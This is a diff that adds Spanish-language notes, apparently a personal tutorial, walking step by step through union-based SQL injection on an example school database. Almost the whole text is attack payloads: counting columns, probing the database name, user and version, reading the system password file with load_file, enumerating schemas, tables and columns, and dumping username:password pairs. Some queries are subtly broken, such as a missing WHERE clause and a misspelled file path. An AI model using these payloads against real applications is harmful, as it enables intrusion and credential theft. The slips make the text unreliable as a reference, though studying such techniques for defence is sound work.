@@ -1,0 +1,39 @@
+1 = Aprovechando el error podemos empezar realizando un ordenamiento a las columnas para encontrar el numero exacto
+    exacto de columnas de una tabla [Es lo primero que debemos hacer como atacantes]:
+
+        select * from Alumnos id = 1 order by 100;-- -;[Comentario para que no salte error]
+
+    Cuando ya averiguamos cuantas columnas exactas tiene, ya podemos aplicar un ordenamiento por el numero de columnas.
+
+2 = Hacemos una seleccion de las columnas encontradas para poner etiquetas:
+
+        select * from Alumnos where id = 1 union select 1,2,3,4;-- -;
+
+[NOTA]= Normalmente metemos el codigo en la URL que va despues de "id=", en la url no hace falta acabar la sentencia con ";"
+
+3 = En este punto podemos empezar a aplicar las injecciones aplicando sentencias por ejemplo:
+
+    select * from Alumnos where id = 1 union select 1,database(),3,4;-- -;
+    select * from Alumnos where id = 1 union select 1,user(),3,4;-- -;
+    select * from Alumnos where id = 1 union select 1,version(),3,4;-- -;
+
+    * Incluir archivo local y que nos puede el contenido del mismo:
+
+    select * from Alumnos where id = 1 union select 1,load_file('/ect/passwd'),3,4;-- -;
+
+4 = En este punto ya sabemos el nombre de la base de datos, pero tambien nos interesa saber que otras bases de datos hay,por 
+    tanto hacemos lo siguiente:
+
+    select * from Alumnos where id = 1 union select 1,schema_name,3,4 from information_schema.schemata;-- -;
+
+5 = Ver las tablas de una base de datos:
+
+    select * from Alumnos where id = 1 union select 1,table_name,3,4 from information_schema.tables where table_schema = "Colegio";-- -;
+
+5 = Ahora vemos las columnas de la tabla:
+
+    select * from Alumnos where id = 1 union select 1,column_name,3,4 from information_schema.columns where table_schema = "Colegio" and table_name="Alumnos";-- -;
+
+6 = Para abrir la informacion de las olumnas:
+
+    select * from Alumnos where id = 1 union select 1,concat(username,0x3a,password),3,4 from Colegio.Alumnos;-- -;
